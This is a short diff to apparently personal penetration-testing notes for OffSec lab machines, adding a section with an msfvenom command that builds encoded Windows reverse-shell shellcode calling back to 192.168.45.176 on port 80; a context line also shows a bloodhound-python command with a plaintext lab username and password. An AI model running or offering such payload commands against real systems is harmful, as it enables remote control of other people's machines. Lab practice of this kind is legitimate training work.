@@ -742,6 +742,11 @@ bloodhound-python -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -c all -
 
 ```
 
+## MSFVENOM SHELL CODE
+```bash
+┌──(root㉿kali)-[~/kevin]
+└─# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.176 LPORT=80 -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a' -e x86/alpha_mixed -f c  
+```
 
 
 ## File transfer
